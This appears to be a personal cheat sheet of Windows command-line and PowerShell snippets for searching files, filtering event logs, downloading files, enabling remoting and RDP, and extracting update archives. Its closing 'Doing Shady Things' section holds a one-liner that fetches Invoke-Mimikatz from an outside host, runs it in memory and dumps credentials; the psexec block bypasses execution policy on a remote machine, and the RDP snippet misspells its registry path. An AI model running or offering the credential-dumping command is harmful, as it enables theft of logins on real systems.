# Command Line Kung-Fu
Some things I've picked up over the years.
## Parsing Stuff
Literal string match recursively from the root of the C: drive:
```
findstr /pinsc:"somestring" C:\*.txt
```
RegEx string match recursively in all text and xml files:
```
findstr /pinsr ^some.tring *.txt *.xml
```
Filtering Saved Windows Event Log Files With PowerShell
```
Get-WinEvent -Path "\\server\share\name-of-log.evt" -Oldest -FilterXPath "*[EventData[Data[@Name='TargetUserName'] = 'user.name']] or *[EventData[Data[@Name='Workstation'] = 'host-name']]"
```
And If You Wanna' Get Fancy
```
Get-WinEvent -Path "\\server\share\name-of-log.evt" -Oldest -FilterXPath "*[EventData[Data[@Name='TargetUserName'] = 'user.name']] or *[EventData[Data[@Name='Workstation'] = 'host-name']]" | Select-Object -Property TimeCreated,Id,ProviderName,LogName,TaskDisplayName,Message,ContainerLog | ConvertTo-Html -Property * -As Table -Title 'Something' -PreContent '<H1>UserName: user.name</H1><H2>Workstation: host-name</H2><H2>Date: MM/DD/YYYY</H2>' | Out-File -FilePath C:\Path\To\File.html
```
## Downloading Stuff
Like wget for older versions of PowerShell
```
(New-Object System.Net.WebClient).DownloadFile("https://www.contoso.com/file","C:\path\file")
```
Or wget for newer PowerShell
```
Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"
```
## Doing Stuff Remotely
Enabling PsRemoting Remotely :-)
```
$NaughtyComputer = Read-Host "Please Enter The ComputerName:"
psexec.exe -accepteula -s -h -e -d \\some-hostname powershell.exe "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
psexec.exe -accepteula -s -h -e -d \\some-hostname powershell.exe "Enable-PSRemoting -Force"
Enter-PSSession -ComputerName $NaughtyComputer
```
Enabling RDP Remotely
```
$computerName = $env:COMPUTERNAME

$ExePath = 'C:\Windows\System32\reg.exe'

$RegKey = '\HKLM\SYSTEM\CurentControlSet\Control\Terminal Server'

$RemoteRegKeyString = '\\' + $ComputerName + $RegKey

[array] $InstallArgs = @(
	'add',
	$RemoteRegKeyString,
	'/v fDenyTSConnections',
	'/t REG_DWORD',
	'/d 0',
	'/f'
)

Start-Process -FilePath $ExePath -ArgumentList $InstallArgs -NoNewWindow -Wait | Out-Null
```
## Doing Things Iteratively
Getting  all the .msp files out of your windows Update .cab archives
```
Get-ChildItem -Path C:\Windows\SoftwareDistribution\Download\*.cab -Recurse | Select-Object -ExpandProperty FullName | ForEach-Object {expand.exe $_ -F:* C:\Updates\}
```
## Doing Shady Things
Dumping Some Creds
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File "$($Env:TEMP)\output.txt"
```
